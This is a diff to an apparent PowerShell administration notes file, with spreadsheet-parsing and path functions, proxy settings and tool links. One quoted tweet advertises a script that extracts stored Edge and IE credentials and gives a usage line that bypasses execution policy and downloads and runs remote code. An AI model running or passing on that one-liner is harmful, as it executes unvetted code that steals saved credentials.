@@ -1,14 +1,95 @@
+Filter Get-Split {param([string[]]$Input,[string]$Delimiter=';') $Input | % { $_ -split $Delimiter} }
+
+'net use O: \\tsclient\C /persistent:yes' | out-file O.ps1
+
+$f = 'Master Patching Server List v5-write.xlsx'
+Function Select-SheetString {
+  [CmdletBinding(DefaultParameterSetName='Path')]param(
+    [Parameter(Position=0,ValueFromPipeline,ValueFromPipelineByPropertyName,
+     Mandatory, ParameterSetName='Path')][Alias('FileName')]
+    [string[]]$Path,
+    
+    [Parameter(Position=0,ValueFromPipeline,ValueFromPipelineByPropertyName,
+     Mandatory, ParameterSetName='LiteralPath')]
+    [Alias('Fullname','PSPath')]
+    [System.IO.FileSystemInfo[]]$LiteralPath=@(),
+    
+    [Parameter(Position=1)][Alias('Filter')][string[]]$Pattern='.*',
+    [Alias=('NotRegex')][string]$SimpleMatch
+  )
+  Begin {
+    If ($PSBoundParameters.ContainsKey('SimpleMatch')) {
+      $Simple = @{ SimpleMatch = $($PSBoundParameters.SimpleMatch) }
+    } Else {
+      $Simple = @{ SimpleMatch = $False }
+    }
+  }
+  Process {
+    $FileNames = If ($LiteralPath) { $LiteralPath } ElseIf ($Path) { $Path }
+    ForEach ($file in $FileNames) {
+      # $xmlfilenames = (7z l -r -so $file *.xml) -match '^\d{4}-\d\d-.*?\S\s\S{5}\s' | 
+      #   % { $null,$null,$null,$fn = $_ -split '\s\s+'; $fn }
+      # 7z x $file -Ot
+      [xml]$strings = 7z x -so $file xl\SharedStrings.xml 
+      Write-Verbose "String count: $($strings.count)"
+      $strings.sst.si.t | Select-String $Pattern @Simple
+    }
+  }
+  End {}
+}
+
+xcopy ($Profile -replace '^.:', '\\TSClient\C\Users') $Profile /d /y
 
 <#
 XpdfReader-win64-4.00.01.exe
+Show Explorer or Group Policy mapped drives for Admin
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /D 1
 
 https://www.fosshub.com/IrfanView.html/iview451_plugins_x64_setup.exe
 
-Just wrote a little (3 Lines 🤣)script to extract stored credentials from Edge && IE
+Just wrote a little (3 Lines)script to extract stored credentials from Edge && IE
 Code: https://t.co/dOJIw7DjNW
-Usage: powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://t.co/0sIMOcEfb9’)"
+Usage: powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(https://t.co/dOJIw7DjNW)"
 #infosec #pentest #redteam https://t.co/gOTKzBPQNE (https://twitter.com/HanseSecure/status/988377489994022912?s=03)
+#https://www.makeuseof.com/tag/3-scripts-modify-proxy-setting-internet-explorer/
+# Windows Automation API: UI Automation https://msdn.microsoft.com/en-us/library/ms726294(VS.85).aspx
+# AutoIT https://www.autoitscript.com/site/
 
+Dump all server Cis in the CMDB..
+Launch Service Flow from the DCS Portal home page > Published Reports > CMDB Assets > CMDB Assets Hardware > CMDB Hardware Asset Data.  
+Interact online, or Tools > Export to CSV
+
+
+  netsh winhttp show proxy
+  netsh winhttp import proxy source=ie
+  
+  $webclient=New-Object System.Net.WebClient
+  $creds=Get-Credential
+  $webclient.Proxy.Credentials=$creds
+
+Function Get-FirstVersion {
+  [CmdLetBinding()]Param(
+    [Alias('CommandName')][string[]]$Name
+  )
+  $baseUri = 'https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Archive'
+  ForEach ($Command in $Name) {
+    ForEach ($Version in ('3.0','4.0','5.0','5.1','6')) {
+      $Uri = ("$baseUri/$command" + "?view=powershell-$version")
+      $Request = try { Invoke-WebRequest -uri $Uri -MaximumRedirection 0 -ea Ignore } catch {}
+      Write-Verbose $Request
+      If ($Request -and ($Url = $Request.Headers.Location)) {
+        Write-Verbose $Url
+        If ($Url -notlike ‘*FallbackFrom*’) { 
+          [pscustomobject]@{
+            Name    = $Command 
+            Version = [Version]$Version 
+          }
+        }  
+      }  
+    }  
+  }
+}
+  
 https://github.com/kirillkovalenko/nssm
 
 DeDuplicate History
@@ -33,6 +114,40 @@ https://patrick6649.files.wordpress.com/2018/03/ad_final.zip PowerShell menu too
 High Performance PowerShell with LINQ  https://www.red-gate.com/simple-talk/dotnet/net-framework/high-performance-powershell-linq/
 
 LiveEdu.tv Live Coding vs. Twitch (gaming)  Troop editor LiveCode.com
+
+function Convert-Path {
+  <#
+    .SYNOPSIS
+      A Convert-Path that actually returns the correct _case_ for file system paths on Windows
+    .EXAMPLE
+      New-PSDrive PS FileSystem C:\WINDOWS\SYSTEM32\WINDOWSPOWERSHELL
+      Set-Location PS:\
+      Convert-Path .\v*\modules\activedirectory
+      
+      The built-in Convert-Path would return:
+      "C:\WINDOWS\SYSTEM32\WINDOWSPOWERSHELL\v1.0\modules\ActiveDirectory"
+      
+      This implementation would return the case-sensitive correct path:
+      "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory"
+  #>
+  [CmdletBinding()]
+  param(
+    [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
+    [ValidateNotNullOrEmpty()][Alias("PSPath")][string[]]$Path
+  )
+  process {
+    # First, resolve any relative paths or wildcards in the argument
+    # Use Get-Item -Force to make sure it doesn't miss "hidden" items
+    $LiteralPath = @(Get-Item $Path -Force | Select-Object -Expand FullName)
+    Write-Verbose "Resolved '$Path' to '$($LiteralPath -join ', ')'"
+    # Then, wildcard in EACH path segment forces OS to look up the actual case of the path
+    $Wildcarded = $LiteralPath -replace '(?<!(?::|\\\\))(\\|/)', '*$1' -replace '$', '*'
+    $CaseCorrected = Get-Item $Wildcarded -Force | Microsoft.PowerShell.Management\Convert-Path
+    Write-Verbose "Case correct options: '$($CaseCorrected -join ', ')'"
+    # Finally, a case-insensitive compare returns only the original paths
+    $CaseCorrected | Where-Object { $LiteralPath -iContains "$_" }
+  }
+}
 
 Join-Path -Path (Get-PSDrive -PSProvider filesystem | ? { $_.root } | % { $_.Root }) -ChildPath Util -resolve -ea 0 2>$null
 https://github.com/canix1/ADACLScanner
